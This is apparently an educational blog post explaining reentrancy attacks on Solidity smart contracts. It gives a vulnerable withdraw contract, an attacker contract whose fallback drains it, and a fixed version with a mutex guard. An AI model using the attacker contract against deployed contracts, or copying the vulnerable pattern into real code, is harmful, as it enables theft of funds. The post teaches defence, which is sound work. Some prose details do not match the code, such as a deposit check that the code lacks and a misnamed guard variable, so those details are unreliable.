# Solidity Attack Vectors: #1 - Reentrancy Attack

Reentrancy attacks are a well-known vulnerability in Solidity, with many projects falling victim to this type of attack(The DAO Hack).

## What is Reentrancy?

Reentrancy attacks occur when an attacker(usually a contract) is able to call a function in another contract repeatedly before that function has a chance to finish executing, allowing the attacker to drain the contract's resources or manipulate its data.

### How does this happen?

Reentrancy happens in a simple way but can become very complex. A contract `A` makes an external call to contract `B`, while this call or function is still being executed, contract `B` calls back into contract `A` multiple times repeatedly until a predefined condition is met.

Here's a simple example of a contract vulnerable to reentrancy attack below:

```solidity
pragma solidity ^0.8.0;

contract ReentrancyVulnerable {
    mapping(address => uint256) public balances;

    function Deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function Withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0);

        msg.sender.call{value: balance}("");
        balances[msg.sender] = 0;
    }
}
```

The contract includes a function called "deposit" that allows users to add funds to their balance by updating the "balances" mapping with the amount of ether being sent. This function only allows deposits if the amount is greater than zero. The contract also includes a "withdraw" function that allows users to transfer their balance to themselves and set their balance to zero. However, this design leaves the contract vulnerable to reentrancy attacks.

If a malicious contract repeatedly calls the "withdraw" function and includes a logic to recall the function, it can drain the balance of the targeted contract until it reaches zero. This is because the contract makes an external call (transferring ether out) before updating its state (setting the caller's balance to zero), leaving it open to exploitation.

Below is an example of a malicious contract created by an attacker to exploit the reentrancy vulnerable contract:

```solidity
pragma solidity ^0.8.0;

contract Attacker {
    ReentrancyVulnerable reentrancyVulnerable;

    constructor(ReentrancyVulnerable _reentrancyVulnerable) {
        reentrancyVulnerable = _reentrancyVulnerable;
    }

    fallback() external payable {
        if (address(reentrancyVulnerable).balance >= 1 ether) {
            reentrancyVulnerable.Withdraw();
        }
    }

    function Attack() public payable {
        reentrancyVulnerable.Deposit{value: 1 ether}();
        reentrancyVulnerable.Withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

The Attacker contract is able to exploit the ReentrancyVulnerable contract by repeatedly calling the "deposit" and "withdraw" functions within the "attack" function. This causes the "fallback" function in the Attacker contract to be triggered, which then initiates a reentrancy attack by continuously calling the "withdraw" function in the ReentrancyVulnerable contract as long as it has more than 1 ether. The vulnerability in the ReentrancyVulnerable contract lies in the fact that it transfers the ether before updating balances in the "withdraw" function, allowing the Attacker contract to continually exploit it.

# How to prevent Reentrancy Attack on smart contracts

To prevent reentrancy attacks, it is important to consider the following:

1. Use a mutex (mutual exclusion) pattern to block multiple calls to the same function(like the reentrancyGuard modifier technique).
2. Update the state of your contract before making external calls when applicable.
3. Carefully consider the order in which functions are called and which data is accessed.
4. Have your smart contract audited before deploying for production use.

Here is an example code on how to prevent reentrancy:

```solidity
pragma solidity ^0.8.0;
contract reentrancySafe {
    bool entered;
    mapping(address => uint256) balances;

    modifier reentrancyGuard() {
        require(!entered);
        entered = true;
        _;
        entered = false;
    }

    //use the reentrancy guard modifier
    function Withdraw() public reentrancyGuard {
        uint256 balance = balances[msg.sender];
        require(balance > 0);
        //update state by setting caller's balance to zero before transferring ether
        balances[msg.sender] = 0;

        msg.sender.call{value: balance}("");
    }
}
```

In this code, we have implemented a reentrancy guard to protect against attackers who may try to repeatedly call the "withdraw" function. The reentrancy guard works by using a boolean called "isEntered" that prevents the function from being recalled when it is set to true. To further secure the contract against vulnerabilities, we have also set the caller's balance before transferring Ether. By implementing these measures, we are able to fix a contract that was previously vulnerable to reentrancy attacks.

Thank you for reading, I hope this helps you to better understand reentrancy attacks and the preventive measures you can take.
